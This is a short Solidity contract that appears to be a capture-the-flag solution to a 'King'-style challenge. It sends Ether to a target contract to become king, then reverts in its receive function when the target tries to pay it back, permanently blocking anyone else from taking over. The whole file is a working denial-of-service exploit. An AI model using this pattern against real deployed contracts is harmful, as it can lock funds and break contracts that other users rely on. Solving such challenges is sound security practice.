// SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.13;

contract Solve {
    address public target;

    constructor(address _target) payable {
        target = _target;
    }

    function attack() public payable {
        payable(target).call{value: msg.value}("");
    }

    receive() external payable {
        if (msg.sender == target) {
            revert("King Contract DoS Attack Success!");
        }
    }
}